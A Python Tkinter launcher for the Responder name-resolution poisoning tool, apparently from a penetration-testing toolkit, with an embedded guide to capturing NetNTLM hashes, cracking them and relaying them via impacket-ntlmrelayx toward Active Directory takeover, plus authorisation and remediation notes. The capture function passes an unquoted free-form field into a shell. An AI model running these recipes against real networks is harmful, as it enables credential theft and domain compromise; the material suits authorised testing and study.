#!/usr/bin/env python3

from tkinter import *
from datetime import datetime
import os
import shlex
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import VENDOR_DIR

#Define variables outside functions here:

info = r'''

     ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗
     ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
     ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
     ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
     ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝


Responder (lgandx fork)  -  vendor/Responder/Responder.py

Poisons the name-resolution protocols Windows falls back to when DNS fails
(LLMNR / UDP 5355, NBT-NS / UDP 137, mDNS / UDP 5353) and stands up rogue
SMB / HTTP / MSSQL / FTP / LDAP / DNS / WPAD servers.  A victim that follows the
poisoned answer authenticates to those rogue servers and leaves a NetNTLMv1/v2
challenge-response you can crack or relay.  The core internal-AD credential-
capture tool.

what triggers a hit
    typo'd \\share names, stale DNS records, WPAD ("auto-detect proxy") lookups,
    logon scripts / scheduled tasks pointing at dead hosts, Explorer and Office
    auto-discovery.  You are catching other people's mistakes - hit rate tracks
    how busy the segment is.

use it in this order
    1. ANALYZE first     ./Responder.py -I eth0 -A
       Watches LLMNR / NBT-NS / mDNS / BROWSER requests and poisons NOTHING.
       Tells you whether the protocols are in use and who is noisy.  Safe when
       you must not disrupt users - get sign-off before step 2.
    2. CAPTURE           ./Responder.py -I eth0 -wv
       Poison + rogue WPAD.  NetNTLMv2 -> hashcat -m 5600  (v1 -> -m 5500),
       or john.  Hashes land in vendor/Responder/logs/  (one file per victim
       per type; the console prints only the first per account, the log keeps
       every one).
    3. RELAY (no cracking)   in Responder.conf set  SMB = Off  and  HTTP = Off
       run Responder for poisoning only, then impacket ntlmrelayx (exploit_impacket):
         - relay to SMB   (needs target "SMB signing: not required") -> secretsdump / exec
         - relay to LDAP/LDAPS  -> RBCD or Shadow Credentials -> takeover
         - relay to AD CS web enrollment (ESC8)  -> machine/user cert -> DA
       Relaying wins when the password is too strong to crack.

high-value switches
    -w              rogue WPAD proxy (huge where "auto-detect settings" is on)
    -P  -F          force proxy / WPAD auth prompts - more hashes, more noise
    -d  -D          answer DHCP, inject WPAD / DNS - aggressive, can disrupt
    --lm            downgrade to LM       ) NetNTLMv1 -> crack.sh is instant
    --disable-ess   disable Ext. Sess. Sec ) -> full NT hash -> pass-the-hash
    -b              serve Basic auth (cleartext creds instead of a hash)
    -v              print captured hashes to the console

command recipes
    ./Responder.py -I eth0 -A                     analyze only - poison nothing
    ./Responder.py -I eth0                        default: poison + all rogue servers
    ./Responder.py -I eth0 -wv                    + rogue WPAD proxy, verbose
    ./Responder.py -I eth0 -wFv                   + force NTLM auth on wpad.dat
    ./Responder.py -I eth0 -Pv                    + force proxy auth (no WPAD needed)
    ./Responder.py -I eth0 -dwv                   + answer DHCP, inject WPAD
    ./Responder.py -I eth0 --lm --disable-ess -v  force crackable NetNTLMv1
    ./Responder.py -I eth0 -bv                    serve Basic -> cleartext creds
    ./Responder.py -I eth0 -e <kali-ip> -v        poison victims to a separate relay box
    ./Responder.py -I ALL -Av                     watch every interface, no poisoning

    loot / logs
    ls vendor/Responder/logs/                     one file per victim per protocol
    cat vendor/Responder/logs/SMB-NTLMv2-SSP-10.0.0.50.txt
    less Responder-Session.log                    full session transcript
    Responder.conf                                toggle servers, set RespondTo / DontRespondTo

    crack what you catch
    hashcat -m 5600 v2.txt rockyou.txt -r rules/best64.rule     NetNTLMv2
    hashcat -m 5500 v1.txt rockyou.txt                          NetNTLMv1
    john --format=netntlmv2 --wordlist=rockyou.txt v2.txt
    NetNTLMv1 + ESS disabled -> submit to crack.sh -> NT hash back -> pass-the-hash

    relay instead of crack   (first: Responder.conf  SMB = Off , HTTP = Off)
    impacket-ntlmrelayx -tf targets.txt -smb2support                       auto-dump SAM
    impacket-ntlmrelayx -t smb://10.0.0.60 -smb2support -c 'whoami'        run a command
    impacket-ntlmrelayx -t ldaps://dc01 --delegate-access                 RBCD takeover
    impacket-ntlmrelayx -t ldaps://dc01 --shadow-credentials --shadow-target 'DC01$'
    impacket-ntlmrelayx -t http://adcs/certsrv/certfnsh.asp --adcs --template Machine   ESC8
    impacket-ntlmrelayx -socks -tf targets.txt                            queue sessions for proxychains

pair with
    mitm_mitm6         IPv6 DNS takeover + ntlmrelayx to LDAP = the classic
                       default-AD "no creds to Domain Admin" chain
    enum_nmblookup     confirm NBT-NS is on before bothering
    bruteforce_hashcat / bruteforce_john   crack what you capture
    exploit_impacket   ntlmrelayx, secretsdump, wmiexec on the relayed session

de-conflict before you start
    free 53 / 80 / 443 / 445: stop smbd and apache2, and turn off
    systemd-resolved's LLMNR (or it fights Responder over 5355).  Scope with
    RespondTo / DontRespondTo in Responder.conf so you never poison DCs/servers.

gotchas
    - Analyze mode (-A) poisons nothing - safe recon; without it you are actively
      redirecting other people's name lookups from the first packet
    - turn SMB and HTTP OFF in Responder.conf before running ntlmrelayx, or Responder
      grabs the auth and the relay gets nothing
    - NetNTLMv1 is crackable to NT almost instantly; NetNTLMv2 only cracks if the
      password is weak - a captured v2 hash is not automatically a win
    - accounts with SMB signing required (all DCs by default) cannot be relayed to,
      only cracked - pick relay targets accordingly
    - modern Windows has LLMNR/NBT-NS off in many builds and mDNS is IPv6-heavy -
      pair with mitm_mitm6 when the classic vectors are quiet
    - leaving systemd-resolved running means it fights you on 5355; a half-freed
      port 445/53/80 makes Responder start but silently not answer

authorisation & reporting
    Poisoning redirects other users' traffic and can drop their sessions - it
    is an active, intrusive technique.  Run steps 2-3 only with explicit written
    sign-off and a defined target list and time window.
    Report the fix: GPO "Turn off multicast name resolution" (LLMNR), disable
    NBT-NS (DHCP option 001 / NIC setting), disable mDNS, require SMB signing,
    blackhole "wpad" in DNS, enforce LDAP channel binding / EPA.

companion tools & smb signing
  scan subnet for smb signing disabled:
    python3 /opt/SKELETON/vendor/Responder/tools/RunFinger.py -i 10.10.10.0/24

  responder.conf smb/http toggle for relaying:
    sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('mitm_responder  —  Responder - LLMNR / NBT-NS / MDNS poisoner')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox

#Define functions

def LOG(cmd):
    stamp = datetime.now().strftime("%d-%b-%Y (%H:%M:%S.%f)")
    text_box.insert('end', "\nTime stamp: {} - {}\n".format(stamp, cmd))
    text_box.yview('end')


def RUN_in_terminal(cmd):
    """Fire `cmd` in its own terminal.  Value fields are already shlex.quote()d
    by the caller; quoting the whole command once more keeps a stray quote in a
    free-form switches field from breaking out into the outer shell."""
    subprocess.call(
        ['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')],
        shell=True,
    )
    LOG(cmd)



def RUN_runfinger():
    target = shlex.quote(target_entry.get().strip() or "10.10.10.0/24")
    cmd = "python3 " + shlex.quote(str(VENDOR_DIR / "Responder" / "tools" / "RunFinger.py")) + " -i " + target
    RUN_in_terminal(cmd)

def RUN_responder_relay_off():
    cmd = "sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf && grep -E '^(SMB|HTTP) =' /etc/responder/Responder.conf"
    RUN_in_terminal(cmd)

def RUN_responder_relay_on():
    cmd = "sudo sed -i 's/^SMB = Off/SMB = On/; s/^HTTP = Off/HTTP = On/' /etc/responder/Responder.conf && grep -E '^(SMB|HTTP) =' /etc/responder/Responder.conf"
    RUN_in_terminal(cmd)

def RUN_responder_analyze():
    if not iface_entry.get().strip():
        LOG("Interface is empty")
        return
    iface = shlex.quote(iface_entry.get().strip())
    cmd = "sudo responder -I " + iface + " -A"
    RUN_in_terminal(cmd)


def RUN_responder_capture():
    if not iface_entry.get().strip():
        LOG("Interface is empty")
        return
    iface = shlex.quote(iface_entry.get().strip())
    switches = switches_entry.get()                    # free-form, left unquoted
    cmd = "sudo responder -I " + iface + " " + switches
    RUN_in_terminal(cmd)


def NEW_Terminal():
    subprocess.call(["gnome-terminal"])

def RUN_module():
    new = subprocess.call(["gnome-terminal --working-directory " + shlex.quote(str(VENDOR_DIR / "Responder")) + " -- bash"], shell = True)
    current_time = datetime.now()
    current_time_value = "\n" + "Time stamp: " + current_time.strftime("%d-%b-%Y (%H:%M:%S.%f)") + " - 2_Responder executed" + "\n"
    text_box.insert('end', current_time_value)
    text_box.yview('end')

#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=0)

#interface
text_box = Text(   #creates text box inside frame_message with info text
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)   #adds info to the end of text_box
text_box.pack(side=LEFT, fill=BOTH, expand=True)   #config for slider variant
text_box.yview('1.0')

sb = Scrollbar(frame_message)   #assign scrollbar
sb.pack(side=RIGHT, fill=BOTH)   #scrollbar configuration

text_box.config(yscrollcommand=sb.set)   #set scrollbar on y axis
sb.config(command=text_box.yview)

RUN_button = Button(frame_buttons1, text=" RUN 2_Responder ", command=RUN_module)
RUN_button.grid(row=0, column=0, padx=5, pady=5)


# --- input fields ------------------------------------------------------
frame_fields = Frame(frame_main)
frame_fields.grid(row=3, column=0, columnspan=8, padx=5, pady=0)

iface_label = Label(frame_fields, text="Interface: ")
iface_label.grid(row=0, column=0, padx=5, pady=4, sticky='e')
iface_entry = Entry(frame_fields, width=12)
iface_entry.grid(row=0, column=1, padx=5, pady=4)
iface_entry.insert(0, os.environ.get("SKELETON_IFACE", "eth0"))

switches_label = Label(frame_fields, text="Additional switches: ")
switches_label.grid(row=1, column=0, padx=5, pady=4, sticky='e')
switches_entry = Entry(frame_fields, width=30)
switches_entry.grid(row=1, column=1, padx=5, pady=4)
switches_entry.insert(0, "-wv")

RUN_responder_analyze_button = Button(frame_buttons1, text=" RUN responder analyze ", command=RUN_responder_analyze)
RUN_responder_analyze_button.grid(row=0, column=0, padx=5, pady=5)

RUN_responder_capture_button = Button(frame_buttons1, text=" RUN responder capture ", command=RUN_responder_capture)
RUN_responder_capture_button.grid(row=0, column=1, padx=5, pady=5)

NEW_button = Button(frame_buttons1, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=0, column=1, padx=5, pady=5)


target_label = Label(frame_fields, text="Target IP / CIDR: ")
target_label.grid(row=1, column=0, padx=5, pady=4, sticky='e')
target_entry = Entry(frame_fields, width=24)
target_entry.grid(row=1, column=1, padx=5, pady=4)
target_entry.insert(0, os.environ.get("SKELETON_TARGET", "10.10.10.0/24"))

frame_buttons1_r1 = Frame(frame_main)
frame_buttons1_r1.grid(row=3, column=0, columnspan=8, padx=5, pady=4)

FINGER_btn = Button(frame_buttons1_r1, text=" RUN RunFinger (SMB signing) ", command=RUN_runfinger)
FINGER_btn.grid(row=0, column=0, padx=5, pady=5)

RELAY_off_btn = Button(frame_buttons1_r1, text=" SMB+HTTP Off (for relay) ", command=RUN_responder_relay_off)
RELAY_off_btn.grid(row=0, column=1, padx=5, pady=5)

RELAY_on_btn = Button(frame_buttons1_r1, text=" SMB+HTTP On (restore) ", command=RUN_responder_relay_on)
RELAY_on_btn.grid(row=0, column=2, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
